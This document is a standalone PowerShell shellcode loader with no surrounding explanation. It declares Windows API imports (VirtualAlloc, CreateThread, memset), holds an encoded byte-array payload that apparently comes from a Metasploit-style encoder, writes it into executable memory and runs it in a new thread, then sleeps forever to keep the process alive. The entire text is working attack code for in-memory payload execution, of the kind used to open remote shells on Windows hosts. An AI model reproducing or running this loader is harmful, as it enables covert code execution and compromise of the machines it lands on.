$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xdb,0xc4,0xba,0xf4,0x41,0x38,0xde,0xd9,0x74,0x24,0xf4,0x5f,0x33,0xc9,0xb1,0x6a,0x31,0x57,0x18,0x03,0x57,0x18,0x83,0xc7,0xf0,0xa3,0xcd,0x65,0xb5,0x2d,0x43,0x2b,0x9f,0xf4,0x42,0x3f,0x3b,0x0d,0x2a,0xf3,0x8a,0x5c,0xb0,0xc2,0x52,0x8b,0x34,0x7b,0x7e,0x30,0xfc,0x87,0xd1,0xcd,0x90,0xd1,0x80,0x36,0xf9,0x7b,0x0b,0xbb,0x72,0xd0,0x7a,0x2e,0x48,0xbb,0x9d,0xd6,0xd9,0xd4,0xd7,0x05,0xe3,0x76,0x19,0xad,0x5d,0x74,0x51,0x90,0x03,0xee,0x7d,0x0e,0x27,0x18,0x8b,0x26,0x64,0x02,0x4a,0x43,0x68,0x22,0x8b,0x34,0x3b,0x84,0xff,0x60,0x84,0xb9,0x87,0x73,0xe7,0x5f,0x1a,0x13,0xe8,0x8a,0x68,0xb5,0x8f,0x58,0xa7,0x0a,0xb9,0x03,0x2b,0x42,0x88,0xe5,0xfb,0xd7,0x21,0xf5,0xdc,0xc5,0xae,0x6b,0xea,0x53,0xb2,0x32,0xd1,0x60,0x90,0xd3,0x86,0xd1,0x0a,0x8f,0x96,0xdc,0xac,0x56,0xa2,0x9b,0x74,0xd6,0xe5,0xdd,0xef,0xa7,0x65,0xb8,0x1d,0x39,0xfc,0x56,0x77,0xa4,0x92,0x8a,0x49,0xb6,0x8f,0x0e,0x4f,0xdf,0xf2,0x70,0xd2,0xad,0x6a,0xf8,0x40,0x8f,0xbb,0x4a,0xa2,0xb0,0x8d,0xa3,0xa5,0x9c,0x52,0xeb,0x74,0xe7,0x94,0xed,0x68,0xa1,0x9a,0xff,0xe9,0x59,0x33,0x77,0x18,0xfe,0x69,0x9f,0xd6,0x39,0xfc,0x70,0xa9,0xf3,0x87,0x9e,0x61,0x01,0x5a,0xdf,0x96,0x2d,0xe9,0xd4,0xab,0x17,0x69,0x76,0xe8,0xdd,0xfb,0xda,0xfb,0x2b,0xd9,0xd1,0x7d,0xed,0x00,0x3f,0x03,0x1e,0x0c,0xf3,0x78,0xd5,0x24,0x27,0x5e,0xa0,0x08,0x7b,0x89,0x7d,0x27,0x5c,0x06,0x5c,0x90,0xd1,0xc1,0x15,0x50,0x7f,0xe2,0x42,0xe3,0x7c,0x5b,0xbe,0xe0,0x22,0xfd,0x22,0xfd,0xee,0x8e,0x30,0x1a,0x69,0x61,0x04,0x38,0xbf,0xfb,0xd3,0xf0,0x02,0x0f,0xc8,0xdc,0xc0,0x79,0xca,0xef,0x06,0x26,0xba,0x32,0x38,0x7f,0x19,0xc8,0x26,0x86,0x7f,0xd8,0x23,0x3f,0xd2,0xcc,0x52,0xf9,0x70,0xa9,0x97,0x40,0xbf,0x0c,0xff,0x59,0xd0,0x2c,0x8d,0x76,0x59,0x0c,0x0d,0x51,0x2d,0x83,0xc6,0xd9,0xcf,0x54,0x94,0x31,0xb5,0x0d,0xb3,0x50,0x34,0xf9,0x11,0x2a,0x25,0xec,0x90,0x76,0x28,0x79,0x96,0x90,0x7c,0x57,0x4d,0xb3,0xba,0x63,0x97,0x90,0x7d,0x4f,0x29,0x92,0xf2,0xfe,0x86,0xc8,0x0c,0xf8,0xdd,0x39,0xc0,0x77,0x21,0x0d,0x32,0xe5,0xf5,0xec,0x38,0x3f,0xe0,0xb3,0xba,0x62,0x74,0x1d,0x2c,0xbc,0x13,0xb3,0x75,0x45,0x89,0xf9,0x98,0xc1,0xe6,0x34,0x61,0xa0,0xd8,0x1f,0x73,0xad,0x1d,0x40,0xe3,0xda,0x3a,0xe6,0x97,0xe8,0x21,0x50,0x66,0xc2,0x0a,0x71,0xbd,0x00,0x3b,0x87,0x10,0xac,0xbd,0xb1,0xda,0x54,0x0b,0x7c,0x80,0x23,0xb8,0xd6,0x10,0x26,0xe0,0xef,0x42,0x7c,0xfe,0x5d,0x24,0x6f,0xfb,0xef,0x65;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};